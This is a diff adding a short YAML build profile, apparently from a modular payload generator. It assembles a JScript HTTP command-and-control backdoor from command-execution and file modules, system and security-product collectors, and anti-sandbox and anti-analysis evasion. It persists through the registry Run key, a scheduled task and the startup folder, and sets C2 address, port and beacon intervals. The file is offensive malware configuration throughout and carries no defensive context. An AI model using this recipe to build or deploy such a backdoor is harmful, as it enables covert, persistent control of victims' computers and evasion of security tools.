@@ -1,0 +1,31 @@
+name: js_backdoor_persist
+description: HTTP C2 backdoor with multi-method persistence (registry + schtask + startup)
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/security_products
+
+c2: c2/http_poll
+arch: arch/backdoor
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/anti_analysis
+  - evasion/behavioral_pacing
+
+persist:
+  - persist/registry_run
+  - persist/schtask
+  - persist/startup_folder
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  POLL_INTERVAL: "30000"
+  BEACON_INTERVAL: "30000"
